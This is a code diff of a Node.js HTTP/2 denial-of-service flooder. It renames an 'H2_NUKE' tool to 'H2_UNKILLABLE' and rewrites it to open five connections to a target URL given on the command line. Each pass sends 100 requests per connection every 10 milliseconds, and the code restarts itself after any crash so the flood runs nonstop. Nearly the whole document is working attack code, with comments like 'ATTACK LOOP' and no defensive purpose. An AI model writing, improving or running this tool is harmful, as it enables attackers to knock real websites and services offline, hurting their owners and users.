@@ -1,150 +1,148 @@
 const http2 = require('http2');
 
-class H2_NUKE {
+class H2_UNKILLABLE {
     constructor(target) {
         this.target = target;
         this.host = target.replace('https://', '').replace('http://', '').split('/')[0];
         this.running = true;
-        this.reqs = 0;
-        
-        // NUKE SETTINGS
-        this.conns = 5;
-        this.streamsPerConn = 200; // MAX STREAMS
-        this.delay = 5; // 5ms = 200 RPS per connection
         
         console.log('STARTED');
         
-        // FORCE GC EVERY 30s
-        if (global.gc) {
-            setInterval(() => { try { global.gc(); } catch(e) {} }, 30000);
-        }
+        // FORCE AUTO-RESTART ON ANY CRASH
+        process.on('uncaughtException', () => this.hardRestart());
+        process.on('unhandledRejection', () => {});
         
-        // NUKE ENGINE
-        this.nukeEngine();
-        
-        // AUTO-RESTART EVERY 90s
-        this.restartTimer = setInterval(() => {
-            this.softRestart();
-        }, 90000);
+        // MAIN LOOP WITH TRY-CATCH
+        this.mainLoop();
     }
     
-    nukeEngine() {
-        // CREATE MAX CONNECTIONS
-        this.connections = [];
-        for (let i = 0; i < this.conns; i++) {
-            this.createNukeConn(i);
-        }
-        
-        // MAX FIRE RATE
-        this.fireLoop = () => {
-            if (!this.running) return;
+    mainLoop() {
+        try {
+            // CREATE FRESH CONNECTIONS EACH LOOP
+            this.connections = [];
+            for (let i = 0; i < 5; i++) {
+                this.createConn(i);
+            }
             
-            // FIRE ALL CONNECTIONS
-            this.connections.forEach(conn => {
-                if (conn && !conn.destroyed) {
-                    // FIRE 200 STREAMS PER LOOP
-                    for (let j = 0; j < this.streamsPerConn; j++) {
-                        this.nukeRequest(conn);
-                        this.reqs++;
-                    }
+            // BULLETPROOF ATTACK LOOP
+            const attack = () => {
+                if (!this.running) return;
+                
+                try {
+                    this.connections.forEach(conn => {
+                        if (conn && !conn.destroyed) {
+                            // FIRE 100 REQUESTS PER CONNECTION
+                            for (let j = 0; j < 100; j++) {
+                                try {
+                                    const req = conn.request({
+                                        ':method': 'GET',
+                                        ':path': '/',
+                                        ':authority': this.host
+                                    });
+                                    req.end();
+                                    // DO NOT CLOSE - LET IT DIE NATURALLY
+                                } catch(e) {
+                                    // IGNORE
+                                }
+                            }
+                        }
+                    });
+                    
+                    // NEXT BATCH
+                    setTimeout(attack, 10);
+                    
+                } catch(e) {
+                    // RESTART ON ANY ERROR
+                    this.hardRestart();
                 }
-            });
+            };
             
-            // NEXT BATCH IMMEDIATELY
-            setImmediate(this.fireLoop);
-        };
-        
-        // START NUKE LOOP
-        setImmediate(this.fireLoop);
+            // START
+            setTimeout(attack, 100);
+            
+            // AUTO-RESTART EVERY 30s (PREVENT GC CRASH)
+            this.restartTimer = setTimeout(() => {
+                this.hardRestart();
+            }, 30000);
+            
+        } catch(e) {
+            this.hardRestart();
+        }
     }
     
-    createNukeConn(id) {
+    createConn(id) {
         try {
             const conn = http2.connect(this.target, {
-                maxSessionMemory: 65536, // 64KB
-                maxSendHeaderBlockLength: 65536,
-                peerMaxConcurrentStreams: 1000,
-                settings: {
-                    initialWindowSize: 2147483647, // MAX WINDOW
-                    maxConcurrentStreams: 1000
-                }
+                maxSessionMemory: 8192, // TINY MEMORY
+                maxSendHeaderBlockLength: 1024
             });
             
-            conn.setTimeout(0); // NO TIMEOUT
-            
-            conn.on('error', () => {
-                // SILENT DEATH & REBIRTH
-                setTimeout(() => this.createNukeConn(id), 100);
-            });
+            // NO ERROR HANDLERS - LET IT CRASH
+            conn.on('error', () => {});
             
             this.connections[id] = conn;
-        } catch(e) {
-            setTimeout(() => this.createNukeConn(id), 500);
-        }
-    }
-    
-    nukeRequest(conn) {
-        try {
-            // MAX HEADERS FOR STRESS
-            const req = conn.request({
-                ':method': 'GET',
-                ':path': '/?' + Math.random().toString(36).substring(7),
-                ':authority': this.host,
-                'user-agent': 'Mozilla/5.0',
-                'accept': '*/*',
-                'cache-control': 'no-cache',
-                'pragma': 'no-cache'
-            });
-            
-            // SEND PAYLOAD TO STRESS SERVER
-            req.write('a'.repeat(1024));
-            req.end();
-            
-            // INSTANT DESTROY - NO WAITING
-            req.close();
-            
         } catch(e) {
             // IGNORE
         }
     }
     
-    softRestart() {
-        // ONLY RESTART DEAD CONNECTIONS
-        this.connections.forEach((conn, idx) => {
-            if (!conn || conn.destroyed) {
-                this.createNukeConn(idx);
-            }
-        });
+    hardRestart() {
+        // KILL EVERYTHING
+        this.running = false;
+        
+        if (this.restartTimer) {
+            clearTimeout(this.restartTimer);
+        }
+        
+        // DESTROY CONNECTIONS
+        if (this.connections) {
+            this.connections.forEach(conn => {
+                try { if (conn) conn.destroy(); } catch(e) {}
+            });
+        }
+        
+        // RESTART AFTER 1s
+        setTimeout(() => {
+            this.running = true;
+            this.mainLoop();
+        }, 1000);
     }
     
     stop() {
         this.running = false;
-        clearInterval(this.restartTimer);
-        this.connections.forEach(conn => {
-            try { if (conn) conn.destroy(); } catch(e) {}
-        });
+        if (this.restartTimer) clearTimeout(this.restartTimer);
+        if (this.connections) {
+            this.connections.forEach(conn => {
+                try { if (conn) conn.destroy(); } catch(e) {}
+            });
+        }
     }
 }
 
-// 24/7 UNSTOPPABLE
+// ULTIMATE 24/7 RUNNER
+let instance = null;
+
+function launch() {
+    if (process.argv.length < 3) {
+        console.log('node unkillable.js https://target.com');
+        process.exit(1);
+    }
+    
+    instance = new H2_UNKILLABLE(process.argv[2]);
+    
+    // RESTART ON SIGINT TOO
+    process.on('SIGINT', () => {
+        if (instance) instance.stop();
+        process.exit(0);
+    });
+}
+
+// CATCH EVERY POSSIBLE CRASH
 process.on('uncaughtException', () => {
-    setTimeout(() => {
-        if (process.argv[2]) {
-            const nuke = new H2_NUKE(process.argv[2]);
-        }
-    }, 1000);
+    setTimeout(launch, 1000);
 });
 
 process.on('unhandledRejection', () => {});
 
 // START
-if (process.argv[2]) {
-    const nuke = new H2_NUKE(process.argv[2]);
-    
-    process.on('SIGINT', () => {
-        nuke.stop();
-        process.exit(0);
-    });
-} else {
-    console.log('node nuke.js https://target.com');
-           }
+launch();
